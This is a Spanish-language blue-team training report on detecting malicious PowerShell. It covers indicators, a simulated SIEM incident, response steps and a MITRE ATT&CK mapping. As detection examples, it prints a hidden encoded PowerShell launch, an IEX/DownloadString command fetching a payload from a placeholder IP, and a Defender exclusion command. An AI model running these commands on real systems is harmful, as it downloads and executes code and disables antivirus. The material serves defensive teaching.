# ğŸ›¡ï¸ Reporte 19 â€” Detecting Malware in PowerShell Execution

## ğŸ¯ Objetivo
Detectar comportamiento malicioso en scripts y comandos PowerShell usando logs, comportamiento anÃ³malo, anÃ¡lisis de comandos y correlaciÃ³n MITRE ATT&CK.

---

# ğŸ§  1. Â¿Por quÃ© PowerShell?
Los atacantes lo usan porque:

- Ya viene instalado en Windows  
- Puede descargar archivos  
- Puede ejecutar cÃ³digo directamente en memoria  
- Puede evadir antivirus  
- Tiene acceso directo al sistema  

Por eso es una pieza clave en:
- ransomware  
- Cobalt Strike  
- Empire  
- ataques de phishing avanzados  

---

# ğŸŸ¥ 2. Indicadores de PowerShell malicioso

## 1ï¸âƒ£ PowerShell ejecutado con flags sospechosos  
Ejemplos:
powershell.exe -nop -w hidden -enc <largeBase64String>


Significa:
- sin mensajes  
- ventana oculta  
- payload codificado  

Muy tÃ­pico en malware.

---

## 2ï¸âƒ£ Comandos para descargar payloads

Invoke-WebRequest
Invoke-Expression
(New-Object Net.WebClient).DownloadString(...)


Esto casi siempre indica intento de descargar malware desde internet.

---

## 3ï¸âƒ£ Uso de Base64 en comandos  
Los atacantes codifican scripts para evadir detecciÃ³n.

Ejemplo:

powershell.exe -enc SQBFAFgAIAAoAE4...


---

## 4ï¸âƒ£ PowerShell ejecutÃ¡ndose desde Word/Excel  
Phishing + macro â†’ PowerShell â†’ malware.

Ejemplo:

Parent process: WINWORD.EXE
Child process: powershell.exe


Esto es seÃ±al CRÃTICA.

---

## 5ï¸âƒ£ EjecuciÃ³n desde ubicaciones inusuales  
Ejemplo:

C:\Users\Public\music\ps.exe


O paths temporales.

---

## 6ï¸âƒ£ ScriptBlock Logging muestra funciones sospechosas  
Ejemplo:

IEX (New-Object Net.WebClient).DownloadString(...)
Add-MpPreference -ExclusionPath "C:"


---

# ğŸŸ§ 3. Caso Simulado (PowerShell-based Malware Incident)

### Logs capturados del SIEM:

Event ID 4104 (ScriptBlock Logging)
Command: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4...

Decoded content:
IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.34/payload.ps1
')

Parent Process: WINWORD.EXE

Event: Outbound connection
Destination: 198.51.100.34:80

Event: Defender exclusion created
Add-MpPreference -ExclusionPath "C:\Users\Public"


InterpretaciÃ³n inmediata:
- Word â†’ PowerShell â†’ payload â†’ exclusiÃ³n de antivirus  
- esto es un ataque avanzado tÃ­pico  
- probablemente etapa inicial de ransomware  

---

# ğŸ§  4. AnÃ¡lisis (razonamiento humano â€” AI-proof)

1. PowerShell oculto + codificado = fuerte indicador de malware.  
2. Payload descargado de IP desconocida.  
3. Proceso padre es Word (phishing â†’ macro).  
4. Eliminar exclusiones del antivirus es tÃ©cnica tÃ­pica.  
5. Secuencia indica:
   - infecciÃ³n inicial  
   - descarga de malware  
   - evasiÃ³n de antivirus  
   - preparaciÃ³n para ejecuciÃ³n maliciosa  

ConclusiÃ³n:
> â€œEste es un ataque PowerShell altamente sospechoso y consistente con la fase inicial de un ataque de ransomware.â€

---

# ğŸ›¡ï¸ 5. Acciones recomendadas

1. Aislar inmediatamente la mÃ¡quina afectada.  
2. Revocar tokens y credenciales usadas.  
3. Bloquear IP maliciosa en firewall.  
4. Revisar persistencia:  
   - Scheduled Tasks  
   - Registry Run keys  
   - WMI events  
5. Revisar si otros hosts ejecutaron comandos similares.  
6. Eliminar exclusiones de antivirus.  
7. Resetear credenciales del usuario.  
8. Realizar anÃ¡lisis completo de endpoints.

---

# ğŸ§­ 6. MITRE ATT&CK Mapping

- **T1059.001 â€” PowerShell Execution**  
- **T1059 â€” Command Execution**  
- **T1105 â€” Ingress Tool Transfer**  
- **T1086 â€” PowerShell**  
- **T1562.001 â€” Disable Security Tools**  
- **T1204 â€” User Execution (Phishing)**  

---

# ğŸ“ 7. Resumen Ejecutivo

Se detectÃ³ una ejecuciÃ³n maliciosa de PowerShell iniciada desde Microsoft Word, utilizando comandos codificados y descargando un payload desde una IP sospechosa. El script deshabilitÃ³ protecciones del antivirus, indicando el inicio de una posible infecciÃ³n de malware o ransomware. AcciÃ³n inmediata requerida.



